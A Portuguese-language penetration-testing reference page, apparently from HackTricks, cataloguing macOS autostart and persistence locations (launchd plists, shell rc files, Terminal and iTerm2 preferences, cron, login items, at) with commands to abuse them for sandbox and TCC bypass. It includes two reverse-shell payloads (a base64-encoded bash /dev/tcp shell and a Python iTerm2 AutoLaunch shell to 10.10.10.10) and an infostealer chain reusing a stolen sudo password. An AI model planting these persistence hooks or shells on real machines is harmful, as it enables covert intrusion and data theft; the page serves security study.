# Inicialização automática do macOS

{{#include ../banners/hacktricks-training.md}}

Esta seção baseia-se fortemente na série de blogs [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/); o objetivo é adicionar **mais Locais de Autostart** (se possível), indicar **quais técnicas ainda funcionam** atualmente com a versão mais recente do macOS (13.4) e especificar as **permissões** necessárias.

## Bypass de Sandbox

> [!TIP]
> Aqui você pode encontrar locais de inicialização úteis para **bypass de sandbox**, que permitem simplesmente executar algo **escrevendo-o em um arquivo** e **aguardando** uma **ação** muito **comum**, um **período de tempo** determinado ou uma **ação que você normalmente pode executar** de dentro de uma sandbox sem precisar de permissões de root.

### Launchd

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locais

- **`/Library/LaunchAgents`**
- **Trigger**: Reinicialização
- Root necessário
- **`/Library/LaunchDaemons`**
- **Trigger**: Reinicialização
- Root necessário
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reinicialização
- Root necessário
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reinicialização
- Root necessário
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> Como fato interessante, **`launchd`** possui uma property list incorporada em uma seção Mach-o `__Text.__config`, que contém outros serviços conhecidos que o launchd deve iniciar. Além disso, esses serviços podem conter `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, o que significa que eles devem ser executados e concluídos com sucesso.
>
> Claro, ela não pode ser modificada por causa de code signing.

#### Descrição e Exploitation

**`launchd`** é o **primeiro** **processo** executado pelo kernel do macOS na inicialização e o último a terminar durante o desligamento. Ele deve sempre ter o **PID 1**. Esse processo irá **ler e executar** as configurações indicadas nas **plists** de **ASEP** em:

- `/Library/LaunchAgents`: Agentes por usuário instalados pelo administrador
- `/Library/LaunchDaemons`: Daemons de todo o sistema instalados pelo administrador
- `/System/Library/LaunchAgents`: Agentes por usuário fornecidos pela Apple.
- `/System/Library/LaunchDaemons`: Daemons de todo o sistema fornecidos pela Apple.

Quando um usuário faz login, as plists localizadas em `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` são iniciadas com as **permissões do usuário conectado**.

A **principal diferença entre agents e daemons é que os agents são carregados quando o usuário faz login, enquanto os daemons são carregados na inicialização do sistema** (pois existem serviços, como o ssh, que precisam ser executados antes que qualquer usuário acesse o sistema). Além disso, os agents podem usar a GUI, enquanto os daemons precisam ser executados em segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Há casos em que um **agent precisa ser executado antes de o usuário fazer login**, chamados de **PreLoginAgents**. Por exemplo, isso é útil para fornecer tecnologia assistiva na tela de login. Eles também podem ser encontrados em `/Library/LaunchAgents` (veja [**aqui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) um exemplo).

> [!TIP]
> Novos arquivos de configuração de Daemons ou Agents serão **carregados após a próxima reinicialização ou usando** `launchctl load <target.plist>`. Também é **possível carregar arquivos .plist sem essa extensão** com `launchctl -F <file>` (no entanto, esses arquivos plist não serão carregados automaticamente após a reinicialização).\
> Também é possível **descarregar** com `launchctl unload <target.plist>` (o processo indicado por ele será encerrado),
>
> Para **garantir** que não exista **nada** (como um override) **impedindo** um **Agent** ou **Daemon** **de** **ser executado**, execute: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Liste todos os agents e daemons carregados pelo usuário atual:
```bash
launchctl list
```
#### Exemplo de cadeia maliciosa de LaunchDaemon (reutilização de senha)

Um infostealer recente para macOS reutilizou uma **senha de sudo capturada** para instalar um user agent e um LaunchDaemon de root:

- Grave o loop do agent em `~/.agent` e torne-o executável.
- Gere um plist em `/tmp/starter` apontando para esse agent.
- Reutilize a senha roubada com `sudo -S` para copiá-lo para `/Library/LaunchDaemons/com.finder.helper.plist`, definir `root:wheel` e carregá-lo com `launchctl load`.
- Inicie o agent silenciosamente com `nohup ~/.agent >/dev/null 2>&1 &` para desanexar a saída.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Se um plist pertencer a um usuário, mesmo que esteja em pastas de daemon de todo o sistema, a **task será executada como o usuário** e não como root. Isso pode impedir alguns ataques de privilege escalation.

#### Mais informações sobre launchd

**`launchd`** é o **primeiro** processo em user mode iniciado pelo **kernel**. A inicialização do processo deve ser **bem-sucedida** e ele **não pode sair nem sofrer crash**. Ele também é **protegido** contra alguns **killing signals**.

Uma das primeiras coisas que o `launchd` faria seria **iniciar** todos os **daemons**, como:

- **Timer daemons** baseados no horário de execução:
- atd (`com.apple.atrun.plist`): Tem um `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`): Tem `StartCalendarInterval` para iniciar às 00:15
- **Network daemons** como:
- `org.cups.cups-lpd`: Escuta em TCP (`SockType: stream`) com `SockServiceName: printer`
- SockServiceName deve ser uma porta ou um serviço de `/etc/services`
- `com.apple.xscertd.plist`: Escuta em TCP na porta 1640
- **Path daemons** que são executados quando um path especificado é alterado:
- `com.apple.postfix.master`: Verificando o path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Indica na entrada `MachServices` o nome `com.apple.xscertd.helper`
- **UserEventAgent:**
- Isso é diferente do item anterior. Ele faz o launchd iniciar apps em resposta a um evento específico. No entanto, nesse caso, o binário principal envolvido não é o `launchd`, mas `/usr/libexec/UserEventAgent`. Ele carrega plugins da pasta restrita pelo SIP /System/Library/UserEventPlugins/, onde cada plugin indica seu inicializador na chave `XPCEventModuleInitializer` ou, no caso de plugins mais antigos, no dict `CFPluginFactories`, sob a chave `FB86416D-6164-2070-726F-70735C216EC0` do seu `Info.plist`.

### arquivos de inicialização do shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Útil para bypass do sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Mas é necessário encontrar um app com um TCC bypass que execute um shell que carregue esses arquivos

#### Localizações

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Abrir um terminal com zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Abrir um terminal com zsh
- Requer root
- **`~/.zlogout`**
- **Trigger**: Sair de um terminal com zsh
- **`/etc/zlogout`**
- **Trigger**: Sair de um terminal com zsh
- Requer root
- Potencialmente há mais em: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Abrir um terminal com bash
- `/etc/profile` (não funcionou)
- `~/.profile` (não funcionou)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Esperado para ser acionado com xterm, mas ele **não está instalado** e, mesmo após a instalação, este erro é exibido: xterm: `DISPLAY is not set`

#### Descrição e Exploitation

Ao iniciar um ambiente de shell, como `zsh` ou `bash`, **determinados arquivos de inicialização são executados**. Atualmente, o macOS usa `/bin/zsh` como shell padrão. Esse shell é acessado automaticamente quando o aplicativo Terminal é iniciado ou quando um dispositivo é acessado via SSH. Embora `bash` e `sh` também estejam presentes no macOS, eles precisam ser invocados explicitamente para serem utilizados.

A man page do zsh, que podemos ler com **`man zsh`**, contém uma descrição detalhada dos arquivos de inicialização.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Aplicativos reabertos

> [!CAUTION]
> Configurar a exploração indicada e sair e entrar novamente ou até mesmo reiniciar não funcionou para mim executar o app. (O app não estava sendo executado; talvez ele precise estar em execução quando essas ações forem realizadas)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Gatilho**: Reabrir aplicativos após a reinicialização

#### Descrição e Exploitation

Todos os aplicativos a serem reabertos estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Portanto, para fazer com que o sistema inicie seu próprio app entre os aplicativos reabertos, basta **adicionar seu app à lista**.

O UUID pode ser encontrado listando esse diretório ou usando `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar os aplicativos que serão reabertos, você pode executar:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **adicionar um aplicativo a esta lista**, você pode usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferências do Terminal

- Útil para bypass do sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Uso do Terminal para obter permissões FDA do usuário

#### Localização

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Abrir o Terminal

#### Descrição e Exploitation

Em **`~/Library/Preferences`** são armazenadas as preferências do usuário nos Applications. Algumas dessas preferências podem conter uma configuração para **executar outros Applications/scripts**.

Por exemplo, o Terminal pode executar um comando no Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Essa configuração é refletida no arquivo **`~/Library/Preferences/com.apple.Terminal.plist`** desta forma:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Portanto, se o plist das preferências do terminal no sistema pudesse ser sobrescrito, a funcionalidade **`open`** poderia ser usada para **abrir o terminal, e esse comando seria executado**.

Você pode adicionar isso a partir da CLI com:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Scripts de Terminal / Outras extensões de arquivo

- Útil para ignorar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Uso do Terminal para obter permissões FDA do usuário

#### Localização

- **Em qualquer lugar**
- **Trigger**: Abrir o Terminal

#### Descrição e Exploitation

Se você criar e abrir um [**script `.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx), o **aplicativo Terminal** será invocado automaticamente para executar os comandos indicados nele. Se o aplicativo Terminal tiver privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.

Teste com:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Você também pode usar as extensões **`.command`**, **`.tool`**, com conteúdo de shell scripts comum, e elas também serão abertas pelo Terminal.

> [!CAUTION]
> Se o Terminal tiver **Full Disk Access**, ele poderá concluir essa ação (observe que o comando executado ficará visível em uma janela do Terminal).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Útil para bypass do sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Você pode obter algum acesso adicional ao TCC

#### Localização

- **`/Library/Audio/Plug-Ins/HAL`**
- Root necessário
- **Trigger**: Reiniciar o coreaudiod ou o computador
- **`/Library/Audio/Plug-ins/Components`**
- Root necessário
- **Trigger**: Reiniciar o coreaudiod ou o computador
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Reiniciar o coreaudiod ou o computador
- **`/System/Library/Components`**
- Root necessário
- **Trigger**: Reiniciar o coreaudiod ou o computador

#### Descrição

De acordo com os writeups anteriores, é possível **compilar alguns audio plugins** e fazer com que sejam carregados.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Útil para bypass do sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Você pode obter algum acesso adicional ao TCC

#### Localização

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descrição e Exploitation

QuickLook plugins podem ser executados quando você **aciona a visualização prévia de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin compatível com esse tipo de arquivo** está instalado.

É possível compilar seu próprio QuickLook plugin, colocá-lo em um dos locais anteriores para carregá-lo e, em seguida, acessar um arquivo compatível e pressionar a barra de espaço para acioná-lo.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Útil para bypass do sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Você precisa conseguir executar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Localizado em `~/Library/Preferences/com.apple.loginwindow.plist`

Eles estão deprecated, mas podem ser usados para executar comandos quando um usuário faz login.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Esta configuração é armazenada em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para excluí-lo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
O do usuário root é armazenado em **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Aqui você pode encontrar start locations úteis para **sandbox bypass**, que permitem simplesmente executar algo **escrevendo-o em um arquivo** e **esperando condições não muito comuns**, como **programas específicos instalados, ações de usuário "incomuns"** ou determinados ambientes.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Útil para realizar sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- No entanto, você precisa conseguir executar o binário `crontab`
- Ou ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- É necessário ser root para ter acesso direto de escrita. Não é necessário ser root se você conseguir executar `crontab <file>`
- **Trigger**: Depende do cron job

#### Description & Exploitation

Liste os cron jobs do **usuário atual** com:
```bash
crontab -l
```
Você também pode ver todos os cron jobs dos usuários em **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (requer root).

No macOS, várias pastas que executam scripts com **determinada frequência** podem ser encontradas em:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Lá podem ser encontrados os **jobs** regulares do **cron**, os **jobs** do **at** (pouco utilizados) e os **jobs** **periodic** (usados principalmente para limpar arquivos temporários). Os **jobs periodic** diários podem ser executados, por exemplo, com: `periodic daily`.

Para adicionar um **cronjob de usuário** programaticamente, é possível usar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- O iTerm2 costumava ter permissões TCC concedidas

#### Locais

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Gatilho**: Abrir o iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Gatilho**: Abrir o iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Gatilho**: Abrir o iTerm

#### Descrição e Exploração

Scripts armazenados em **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** serão executados. Por exemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ou:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
O script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** também será executado:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
As preferências do iTerm2 localizadas em **`~/Library/Preferences/com.googlecode.iterm2.plist`** podem **indicar um comando a ser executado** quando o terminal iTerm2 é aberto.

Essa configuração pode ser definida nas configurações do iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E o comando é refletido nas preferências:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Você pode definir o comando a ser executado com:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> É altamente provável que existam **outras formas de abusar das preferências do iTerm2** para executar comandos arbitrários.

### xbar

Artigo: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Útil para ignorar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o xbar precisa estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Solicita permissões de Acessibilidade

#### Localização

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Gatilho**: quando o xbar é executado

#### Descrição

Se o programa popular [**xbar**](https://github.com/matryer/xbar) estiver instalado, é possível escrever um shell script em **`~/Library/Application\ Support/xbar/plugins/`**, que será executado quando o xbar for iniciado:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Porém, o Hammerspoon precisa estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Solicita permissões de Acessibilidade

#### Localização

- **`~/.hammerspoon/init.lua`**
- **Gatilho**: Quando o hammerspoon é executado

#### Descrição

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funciona como uma plataforma de automação para **macOS**, utilizando a **linguagem de scripting LUA** em suas operações. Vale destacar que ele permite a integração de código AppleScript completo e a execução de shell scripts, ampliando significativamente seus recursos de scripting.

O aplicativo procura um único arquivo, `~/.hammerspoon/init.lua`, e, quando iniciado, o script será executado.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o BetterTouchTool precisa estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Ele solicita permissões de Automation-Shortcuts e Accessibility

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Essa ferramenta permite indicar applications ou scripts a serem executados quando determinados atalhos são pressionados. Um atacante pode conseguir configurar seu próprio **shortcut e action a serem executados no banco de dados** para fazer com que código arbitrário seja executado (um shortcut poderia simplesmente pressionar uma tecla).

### Alfred

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o Alfred precisa estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Ele solicita permissões de Automation, Accessibility e até Full-Disk access

#### Location

- `???`

Ele permite criar workflows que podem executar código quando determinadas condições são atendidas. É potencialmente possível que um atacante crie um arquivo de workflow e faça o Alfred carregá-lo (é necessário pagar pela versão premium para usar workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o ssh precisa estar habilitado e ser utilizado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- O SSH costuma ter acesso a FDA

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Login via ssh
- **`/etc/ssh/sshrc`**
- Root necessário
- **Trigger**: Login via ssh

> [!CAUTION]
> Para ativar o ssh, é necessário Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Por padrão, a menos que `PermitUserRC no` esteja definido em `/etc/ssh/sshd_config`, quando um usuário **faz login via SSH**, os scripts **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** serão executados.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas é necessário executar `osascript` com args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- Exploit payload armazenado chamando **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root necessário

#### Description

Em System Preferences -> Users & Groups -> **Login Items**, é possível encontrar **items a serem executados quando o usuário fizer login**.\
É possível listá-los, adicioná-los e removê-los a partir da linha de comando:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
These items are armazenados no arquivo **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** também podem ser indicados usando a API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), que armazenará a configuração em **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Consulte a seção anterior sobre Login Items; esta é uma extensão)

Se você armazenar um arquivo **ZIP** como um **Login Item**, o **`Archive Utility`** o abrirá. Se o zip, por exemplo, estiver armazenado em **`~/Library`** e contiver a pasta **`LaunchAgents/file.plist`** com um backdoor, essa pasta será criada (ela não é criada por padrão) e o plist será adicionado. Assim, na próxima vez que o usuário fizer login novamente, o **backdoor indicado no plist será executado**.

Outra opção seria criar os arquivos **`.bash_profile`** e **`.zshenv`** dentro do HOME do usuário; assim, se a pasta LaunchAgents já existir, essa técnica ainda funcionará.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas é necessário **executar** o **`at`**, e ele precisa estar **enabled**
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- É necessário **executar** o **`at`**, e ele precisa estar **enabled**

#### **Descrição**

As tasks do `at` são projetadas para **agendar tasks únicas** a serem executadas em determinados horários. Diferentemente dos cron jobs, as tasks do `at` são removidas automaticamente após a execução. É importante observar que essas tasks persistem após os reboots do sistema, o que as torna potenciais preocupações de segurança em determinadas condições.

Por **padrão**, elas ficam **disabled**, mas o usuário **root** pode **enable**-las com:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Isso criará um arquivo em 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Verifique a fila de jobs usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Acima, podemos ver dois jobs agendados. Podemos exibir os detalhes do job usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Se as tarefas AT não estiverem habilitadas, as tarefas criadas não serão executadas.

Os **arquivos de tarefas** podem ser encontrados em `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
